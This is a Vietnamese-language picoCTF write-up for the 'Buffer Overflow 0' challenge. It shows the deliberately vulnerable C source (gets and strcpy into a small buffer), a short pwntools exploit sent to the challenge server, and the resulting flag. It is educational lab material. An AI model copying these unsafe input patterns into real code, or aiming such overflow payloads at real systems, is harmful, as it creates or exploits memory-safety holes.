# Buffer Overflow 0
Ở challenge này thì ta sẽ có 2 file, một file binary `vuln` và một file .c `vuln.c`.

Mở file `vuln.c` ta có source như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

Ta thấy 2 dòng lệnh sau dẫn đến lỗi `buffer overflow`:

``` c
strcpy(buf2, input);
...
gets(buf1);
```

Và ta nhìn thấy hàm `sigsegv_handler()` sẽ in ra flag:

``` c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

Và ta thấy dòng code:

``` c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```

Dòng code này cho thấy khi chương trình nhận tín hiệu `SIGSEGV` thì hàm `sigsegv_handler()` sẽ được gọi.

Và giờ ta chỉ cần nhập đầu vào một chuỗi kí tự dài để gây ra tín hiệu `SIGSEGV` và có flag. Dựa vào source code thì ta chỉ cần nhập 17 kí tự là được, nhưng thực tế, khi chạy local thì cần nhập đến 20 kí tự có thể làm được.

``` python 
from pwn import *

payload = 20 * 'a'
#p = process("./vuln")
p = remote("saturn.picoctf.net", 64802)
p.sendline(payload)
p.interactive()
```

Và ta có flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```